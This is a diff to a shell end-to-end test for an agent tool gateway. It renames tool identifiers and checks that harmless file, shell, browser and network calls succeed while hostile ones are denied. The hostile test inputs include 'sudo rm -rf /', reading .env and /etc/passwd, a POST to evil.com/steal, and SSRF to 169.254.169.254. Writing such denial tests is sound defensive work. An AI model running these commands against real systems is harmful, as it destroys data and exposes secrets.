@@ -58,37 +58,37 @@ echo ""
 
 # -- 1. Filesystem --
 echo "▸ Filesystem"
-R=$(gw_call fs1 gateway__fs_write filesystem write '{"path":"/workspace/output/e2e.txt","content":"Hello from E2E test!"}')
+R=$(gw_call fs1 fs_write filesystem write '{"path":"/workspace/output/e2e.txt","content":"Hello from E2E test!"}')
 check "write file" '"status":"allowed"' "$R"
 
-R=$(gw_call fs2 gateway__fs_read filesystem read '{"path":"/workspace/output/e2e.txt"}')
+R=$(gw_call fs2 fs_read filesystem read '{"path":"/workspace/output/e2e.txt"}')
 check "read file" "Hello from E2E test" "$R"
 
-R=$(gw_call fs3 gateway__fs_list filesystem list '{"path":"/workspace/output"}')
+R=$(gw_call fs3 fs_list filesystem list '{"path":"/workspace/output"}')
 check "list dir" '"status":"allowed"' "$R"
 echo ""
 
 # -- 2. Shell --
 echo "▸ Shell"
-R=$(gw_call sh1 gateway__shell_exec shell exec '{"command":"echo Gateway-Shell-OK"}')
+R=$(gw_call sh1 shell_exec shell exec '{"command":"echo Gateway-Shell-OK"}')
 check "echo command" "Gateway-Shell-OK" "$R"
 
-R=$(gw_call sh2 gateway__shell_exec shell exec '{"command":"cat /workspace/output/e2e.txt"}')
+R=$(gw_call sh2 shell_exec shell exec '{"command":"cat /workspace/output/e2e.txt"}')
 check "cat file" "Hello from E2E test" "$R"
 echo ""
 
 # -- 3. Browser --
 echo "▸ Browser"
-R=$(gw_call br1 gateway__browser_browse browser browse '{"url":"https://httpbin.org/html"}')
+R=$(gw_call br1 browser_browse browser browse '{"url":"https://httpbin.org/html"}')
 check "browse HTML" "Moby-Dick" "$R"
 echo ""
 
 # -- 4. Network --
 echo "▸ Network"
-R=$(gw_call net1 gateway__net_request network request '{"url":"https://httpbin.org/get","method":"GET"}')
+R=$(gw_call net1 net_request network request '{"url":"https://httpbin.org/get","method":"GET"}')
 check "GET request" "HTTP 200" "$R"
 
-R=$(gw_call net2 gateway__net_request network request '{"url":"https://httpbin.org/post","method":"POST","body":"{\"test\":true}","headers":{"Content-Type":"application/json"}}')
+R=$(gw_call net2 net_request network request '{"url":"https://httpbin.org/post","method":"POST","body":"{\"test\":true}","headers":{"Content-Type":"application/json"}}')
 check "POST request" "HTTP 200" "$R"
 check "POST body echoed" 'test' "$R"
 echo ""
@@ -96,34 +96,34 @@ echo ""
 # -- Security: Permission Denials --
 echo "▸ Security — Permission Denials"
 
-R=$(gw_call sec1 gateway__fs_read filesystem read '{"path":"/workspace/.env"}')
+R=$(gw_call sec1 fs_read filesystem read '{"path":"/workspace/.env"}')
 check "deny .env read" '"status":"denied"' "$R"
 
-R=$(gw_call sec2 gateway__fs_read filesystem read '{"path":"../../etc/passwd"}')
+R=$(gw_call sec2 fs_read filesystem read '{"path":"../../etc/passwd"}')
 check "deny path traversal" '"status":"denied"' "$R"
 
-R=$(gw_call sec3 gateway__shell_exec shell exec '{"command":"sudo rm -rf /"}')
+R=$(gw_call sec3 shell_exec shell exec '{"command":"sudo rm -rf /"}')
 check "deny sudo" '"status":"denied"' "$R"
 
-R=$(gw_call sec4 gateway__shell_exec shell exec '{"command":"rm -rf /workspace"}')
+R=$(gw_call sec4 shell_exec shell exec '{"command":"rm -rf /workspace"}')
 check "deny rm -rf" '"status":"denied"' "$R"
 
-R=$(gw_call sec5 gateway__browser_browse browser browse '{"url":"http://localhost:8200/health"}')
+R=$(gw_call sec5 browser_browse browser browse '{"url":"http://localhost:8200/health"}')
 check "deny browser localhost" '"status":"denied"' "$R"
 
-R=$(gw_call sec6 gateway__net_request network request '{"url":"https://evil.com/steal","method":"POST"}')
+R=$(gw_call sec6 net_request network request '{"url":"https://evil.com/steal","method":"POST"}')
 check "deny unknown domain" '"status":"denied"' "$R"
 
-R=$(gw_call sec7 gateway__net_request network request '{"url":"https://db.internal/dump","method":"GET"}')
+R=$(gw_call sec7 net_request network request '{"url":"https://db.internal/dump","method":"GET"}')
 check "deny *.internal" '"status":"denied"' "$R"
 echo ""
 
 # -- Security: SSRF Protection (executor-level) --
 echo "▸ Security — SSRF Protection"
-R=$(gw_call ssrf1 gateway__browser_browse browser browse '{"url":"https://192.168.1.1/admin"}')
+R=$(gw_call ssrf1 browser_browse browser browse '{"url":"https://192.168.1.1/admin"}')
 check "block private IP (browser)" "private IP" "$R"
 
-R=$(gw_call ssrf2 gateway__net_request network request '{"url":"http://169.254.169.254/metadata","method":"GET"}')
+R=$(gw_call ssrf2 net_request network request '{"url":"http://169.254.169.254/metadata","method":"GET"}')
 # This will be denied by domain pattern (not in allow list) or by SSRF check
 check "block cloud metadata" '"status":"denied"' "$R"
 echo ""
@@ -142,7 +142,7 @@ echo "▸ Hardening — Rate Limiting"
 HEADERS=$(curl -s -D - "$GW/api/v1/execute" \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"request_id":"rl1","agent_id":"'$AGENT_ID'","execution_id":"rl","user_id":"t","tool":"gateway__net_request","category":"network","action":"request","args":{"url":"https://httpbin.org/get"}}' \
+  -d '{"request_id":"rl1","agent_id":"'$AGENT_ID'","execution_id":"rl","user_id":"t","tool":"net_request","category":"network","action":"request","args":{"url":"https://httpbin.org/get"}}' \
   2>&1 | head -15)
 check "X-RateLimit-Limit" "x-ratelimit-limit" "$(echo "$HEADERS" | tr '[:upper:]' '[:lower:]')"
 check "X-RateLimit-Remaining" "x-ratelimit-remaining" "$(echo "$HEADERS" | tr '[:upper:]' '[:lower:]')"
